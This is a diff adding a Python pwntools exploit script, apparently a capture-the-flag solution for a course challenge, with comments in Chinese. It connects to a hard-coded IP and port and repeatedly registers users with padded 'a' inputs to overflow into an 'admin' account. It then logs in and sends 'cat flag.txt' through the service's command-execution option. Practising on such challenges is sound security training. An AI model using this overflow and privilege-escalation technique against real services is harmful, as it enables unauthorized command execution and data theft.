@@ -1,0 +1,87 @@
+#!/usr/bin/env python3
+from pwn import *
+
+# 設定目標伺服器
+host = "140.113.207.245"
+port = 30172
+
+# 連接到伺服器
+conn = remote(host, port)
+
+
+# 發送用戶名 payload
+payload = b"a" * 24
+conn.recvuntil(b"> ")
+conn.sendline(b"2")  # 選擇註冊
+
+conn.recvuntil(b"> ")
+
+conn.sendline(payload)
+
+# 發送密碼
+conn.recvuntil(b"> ")
+
+payload_two = b"a" * 8
+conn.sendline(payload_two)
+
+for i in range(15,4,-1):
+    conn.sendline(b"2")  # 選擇註冊
+
+    conn.recvuntil(b"> ")
+
+    conn.sendline(b"a" * i)
+
+    conn.recvuntil(b"> ")
+
+    conn.sendline(b"a" * 8)
+
+conn.recvuntil(b"> ")
+
+conn.sendline(b"2")  # 選擇註冊
+
+conn.recvuntil(b"> ")
+
+conn.sendline(b"admin")
+
+# 發送密碼
+conn.recvuntil(b"> ")
+
+conn.sendline(b"a" * 8)
+
+conn.recvuntil(b"> ")
+conn.sendline(b"1")  # 選擇執行命令
+conn.recvuntil(b"> ")
+conn.sendline(b"admin")
+conn.recvuntil(b"> ")
+conn.sendline(b"a" * 8)
+
+#conn.interactive()
+
+conn.recvuntil(b"> ")
+conn.sendline(b"3")  # 選擇執行命令
+conn.recvuntil(b"> ")
+command = "cat flag.txt\n"
+for char in command:
+    conn.send(char.encode())  # 將每個字元逐一傳送
+
+# 接收並打印回應
+response = conn.recvall(timeout=5).decode()
+# 過濾並打印以 "CSC2025" 開頭的行
+for line in response.splitlines():
+    line = line.strip()  # 去除行首尾空白
+     # 檢查行是否以 "CSC2025" 開頭
+     # 如果是，則打印該行
+     # 這裡假設 flag 是以 "CSC2025" 開頭的
+    print(line)
+    if line.startswith("> CSC2025"):
+        print(line)
+
+# 關閉連線
+conn.close()
+
+# 接收並打印回應
+#response = conn.recvall().decode()
+#print(response)
+
+# 進入互動模式
+#conn.interactive()
